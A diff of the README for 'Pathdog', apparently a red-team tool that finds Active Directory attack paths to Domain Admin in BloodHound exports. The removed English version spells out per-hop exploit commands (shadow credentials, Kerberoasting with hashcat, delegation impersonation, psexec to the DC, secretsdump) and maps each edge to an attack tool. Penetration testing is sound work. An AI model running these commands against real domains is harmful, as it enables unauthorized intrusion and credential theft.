@@ -1,188 +1,103 @@
 # Pathdog
 
-BloodHound attack path analyzer — finds paths from owned users to Domain Admin **without Neo4j or any GUI dependency**.
+Analyse un export BloodHound ZIP et trouve les chemins d'attaque vers Domain Admin — sans Neo4j, sans GUI, sans limite de profondeur.
 
-For each hop in a path, Pathdog outputs the exact commands to exploit that relationship (impacket, evil-winrm, bloodyAD, pywhisker, certipy, etc.).
+Pour chaque hop, Pathdog affiche les commandes exactes à exécuter avec l'identité courante propagée tout au long de la chaîne.
 
 ---
 
-## Install
+## Installation
 
 ```bash
 pip install -r requirements.txt
 ```
 
-Python 3.10+ required.
+Python 3.10+
 
 ---
 
 ## Usage
 
 ```
-usage: pathdog [-h] -z FILE [FILE ...] -u USER [USER ...] [-t TARGET]
-               [-k K] [-o BASENAME] [-f {md,html,both}] [-v]
+python pathdog.py -z <dump.zip> -u <user> [options]
 
-arguments:
-  -z / --zip       One or more BloodHound ZIP exports (space-separated)
-  -u / --user      One or more owned users (space-separated), or a .txt file
-                   with one identity per line (lines starting with # ignored)
-  -t / --target    Target node (default: auto-detect DOMAIN ADMINS)
-  -k / --paths     Number of paths to find per user (default: 3)
-  -o / --output    Output file base name (default: pathdog_report)
-  -f / --format    Output format: md, html, or both (default: both)
-  -v / --verbose   Show graph stats (total nodes, pruned nodes, edges)
+  -z  ZIP(s) BloodHound           -z dump.zip  ou  -z a.zip b.zip
+  -u  User(s) owned               -u alice@corp.local  ou  -u owned.txt
+  -t  Cible (défaut: DOMAIN ADMINS auto-détecté)
+  -k  Nombre de chemins par user  (défaut: 3)
+  -o  Nom de base du rapport      (défaut: pathdog_report)
+  -f  Format: md | html | both    (défaut: both)
+  -l  Lister les nœuds et quitter: users | computers | groups | domains | all
+  -v  Stats du graphe
 ```
 
 ---
 
-## Examples
+## Exemples
 
-**Basic scan — one owned user, one ZIP:**
 ```bash
-python pathdog.py -z corp_bloodhound.zip -u john.doe@corp.local
-```
+# Basique
+python pathdog.py -z corp.zip -u john.doe@corp.local
 
-**Multiple ZIPs and users on one line:**
-```bash
-python pathdog.py -z dump1.zip dump2.zip -u john.doe@corp.local svc_backup@corp.local
-```
+# Plusieurs ZIPs et users sur une ligne
+python pathdog.py -z dump1.zip dump2.zip -u alice@corp.local bob@corp.local
 
-**Load owned users from a text file:**
-```bash
-python pathdog.py -z dump1.zip dump2.zip -u owned_users.txt -k 5 -f html -v -o full_report
-```
+# Users depuis un fichier texte (# = commentaire)
+python pathdog.py -z dump1.zip dump2.zip -u owned.txt -k 5 -f html -v
 
-**Explicit target, Markdown only:**
-```bash
-python pathdog.py -z acme_export.zip -u alice@acme.local -t "DOMAIN ADMINS@acme.local" -f md -o acme_paths
-```
-
-`owned_users.txt` format — one identity per line, `#` for comments:
-```
-# Compromised accounts
-john.doe@corp.local
-svc_backup@corp.local
-# DC machine account
-DC01$@corp.local
+# Explorer les nœuds du dump avant de lancer l'analyse
+python pathdog.py -z corp.zip --list users
+python pathdog.py -z corp.zip --list all
 ```
 
 ---
 
-## Multiple ZIPs and multiple owned users
+## Ce que ça fait
 
-When you provide several `-z` flags, Pathdog **merges all dumps into a single graph** before analysis. Duplicate nodes and edges are deduplicated automatically (lowest weight edge is kept).
+**Graphe sans limite de profondeur** — BloodHound GUI tronque silencieusement les chemins longs (limite Cypher). Pathdog utilise NetworkX sans plafond de hops.
 
-When you provide several `-u` flags, Pathdog computes paths independently for each owned user **within the same merged graph**. This means a chain like:
+**Pruning par ancêtres** — avant le pathfinding, le graphe est réduit aux seuls nœuds qui peuvent atteindre DA. Sur un gros dump, ça élimine ~80% des nœuds inutiles.
 
-```
-userA ──[AddSelf]──► GROUP_X ──[GenericWrite]──► userB ──[DCSync]──► DOMAIN ADMINS
-```
+**Fusion de ZIPs** — plusieurs dumps sont mergés en un seul graphe avant analyse. Les nœuds/arêtes dupliqués sont dédupliqués automatiquement. Un chemin cross-user (`alice → svc → [ForceChangePassword] → bob → DA`) est trouvé en un seul passage.
 
-is found in a single pass even if `userA` and `userB` came from different ZIPs — because both users share the same graph after the merge.
-
-**Typical multi-user workflow:**
-```bash
-python pathdog.py \
-  -z bloodhound_ws01.zip bloodhound_ws02.zip \
-  -u owned_users.txt \
-  -k 5 -f html -v -o full_report
-```
-
----
-
-## Why this finds paths that BloodHound GUI misses
-
-BloodHound's built-in Cypher queries (`shortestPath`, `allShortestPaths`) operate on Neo4j with a **default depth limit** (typically 20 hops in the UI, often lower in custom queries). This limit silently truncates long paths.
-
-Pathdog uses **NetworkX's `shortest_simple_paths`** (Yen's K-shortest algorithm) on a locally-built graph — **no hop limit**. The ancestor-pruning step first reduces the graph to only nodes that can reach DA, so even very large dumps process quickly.
-
----
-
-## Exploit commands
-
-For every hop in a found path, Pathdog outputs ready-to-run commands with placeholders for credentials:
+**Propagation d'identité** — les commandes utilisent l'identité *courante* à chaque hop, pas le nœud intermédiaire du graphe :
 
 ```
 john.doe@corp.local
-  └─[GenericWrite]────────────────────────► svc_backup@corp.local
-     ↳ Generic write on svc_backup — write SPN (Kerberoast) or shadow credentials.
-       $ pywhisker -d corp.local -u 'john.doe' -p '<SRC_PASSWORD>' --target 'svc_backup' --action add
-       $ bloodyAD --host <DC_IP> -d corp.local -u 'john.doe' -p '<SRC_PASSWORD>' set object 'svc_backup' servicePrincipalName -v 'fake/blah'
-       $ impacket-GetUserSPNs 'corp.local/john.doe:<SRC_PASSWORD>' -dc-ip <DC_IP> -request
-       $ hashcat -m 13100 spn_hash.txt /usr/share/wordlists/rockyou.txt
-  └─[AllowedToDelegate]───────────────────► DC01.corp.local
-     ↳ Constrained delegation — impersonate Administrator on DC01.corp.local.
-       $ impacket-getST -spn 'cifs/DC01.corp.local' -impersonate 'Administrator' 'corp.local/svc_backup:<SRC_PASSWORD>' -dc-ip <DC_IP>
-       $ export KRB5CCNAME=Administrator@cifs_DC01.ccache
-       $ impacket-psexec -k -no-pass 'corp.local/Administrator@DC01.corp.local'
+  └─[MemberOf]──────────────────────────► HELPDESK@corp.local
+     ↳ Structural relationship — no action required.
+  └─[GenericWrite]──────────────────────► svc_backup@corp.local
+     ↳ pywhisker -d corp.local -u 'john.doe' ...   ← john, pas HELPDESK
+     → now operating as: svc_backup@corp.local
+  └─[ForceChangePassword]───────────────► bob@corp.local
+     ↳ net rpc password 'bob' ... -U 'corp.local/svc_backup%...'
+     → now operating as: bob@corp.local
+  └─[DCSync]────────────────────────────► DOMAIN ADMINS@corp.local
+     ↳ impacket-secretsdump ... 'corp.local/bob:...'
 ```
 
-Replace `<SRC_PASSWORD>`, `<NTLM_HASH>`, and `<DC_IP>` with your actual values.
+**Formats BloodHound** — supporte le format legacy (v4) et BloodHound CE (v5+) avec les arrays `Members`, `LocalAdmins`, `Sessions`, `AllowedToDelegate`, etc.
 
 ---
 
-## Supported BloodHound edge types
+## Exit codes
 
-| Edge | Weight | Exploit approach |
-|------|--------|-----------------|
-| MemberOf | 1 | Passive — already a member |
-| Contains | 1 | Passive — structural |
-| GenericAll | 2 | Password reset / AddMember / shadow creds |
-| DCSync | 2 | `impacket-secretsdump` |
-| GetChangesAll | 2 | DCSync combo → `secretsdump` |
-| AllExtendedRights | 2 | Password reset or DCSync |
-| AddMember | 2 | `net rpc group addmem` / `bloodyAD` |
-| ReadLAPSPassword | 2 | `GetLAPSPassword` / `pyLAPS` |
-| SyncLAPSPassword | 2 | `GetLAPSPassword` / `pyLAPS` |
-| AddSelf | 2 | `net rpc group addmem` (self) |
-| AdminTo | 2 | `psexec` / `wmiexec` / `evil-winrm` |
-| GPLink | 2 | `pygpoabuse` / `SharpGPOAbuse` |
-| WriteDacl | 3 | `dacledit.py` → grant GenericAll |
-| WriteOwner | 3 | `owneredit.py` + `dacledit.py` |
-| GenericWrite | 3 | Shadow creds (`pywhisker`) or WriteSPN + Kerberoast |
-| Owns | 3 | `owneredit.py` + `dacledit.py` |
-| ForceChangePassword | 3 | `net rpc password` / `bloodyAD` |
-| CanRDP | 3 | `xfreerdp` |
-| CanPSRemote | 3 | `evil-winrm` |
-| ExecuteDCOM | 3 | `impacket-dcomexec` |
-| SQLAdmin | 3 | `impacket-mssqlclient` + `xp_cmdshell` |
-| WriteSPN | 3 | Set fake SPN → `GetUserSPNs` → `hashcat` |
-| TrustedBy | 3 | Golden ticket + extra SID |
-| AllowedToDelegate | 4 | `getST -impersonate Administrator` |
-| HasSession | 4 | Connect + Mimikatz / Rubeus token steal |
-| WriteAccountRestrictions | 4 | RBCD (`rbcd.py` → `getST`) |
-| AddKeyCredentialLink | 4 | Shadow creds (`pywhisker` → `gettgtpkinit`) |
-| AllowedToAct | 5 | RBCD (`addcomputer` → `rbcd.py` → `getST`) |
-| *(unknown)* | 5 | Consult BloodHound documentation |
+| Code | Signification |
+|------|--------------|
+| 0 | Chemins trouvés |
+| 1 | Erreur (ZIP invalide, user introuvable, etc.) |
+| 2 | Aucun chemin vers DA |
 
 ---
 
-## Report output
+## Edge types supportés
 
-### Console
-Inline exploit commands after each hop.
+| Weight | Edges |
+|--------|-------|
+| 1 | MemberOf, Contains |
+| 2 | GenericAll, DCSync, GetChangesAll, AllExtendedRights, AddMember, AddSelf, ReadLAPSPassword, SyncLAPSPassword, AdminTo, GPLink |
+| 3 | WriteDacl, WriteOwner, GenericWrite, Owns, ForceChangePassword, CanRDP, CanPSRemote, ExecuteDCOM, SQLAdmin, WriteSPN, TrustedBy |
+| 4 | AllowedToDelegate, HasSession, WriteAccountRestrictions, AddKeyCredentialLink |
+| 5 | AllowedToAct, *(inconnu)* |
 
-### HTML
-Standalone dark-theme single-file HTML. Multi-user mode generates one section per owned user.
-
-### Markdown
-GitBook-compatible with tables, code blocks, and per-hop exploit steps.
-
----
-
-## Project structure
-
-```
-pathdog/
-├── pathdog/
-│   ├── __init__.py
-│   ├── loader.py       # ZIP parsing → nodes/edges
-│   ├── graph.py        # NetworkX DiGraph builder + pruning
-│   ├── weights.py      # Edge weight table
-│   ├── pathfinder.py   # Path computation logic
-│   ├── commands.py     # Exploit command templates per edge type
-│   └── report.py       # Markdown + HTML report renderer
-├── pathdog.py          # CLI entrypoint
-├── requirements.txt
-└── README.md
-```
+Le weight représente la résistance d'exploitation — Dijkstra cherche le chemin de **weight total minimum** (le plus facile à exploiter de bout en bout).
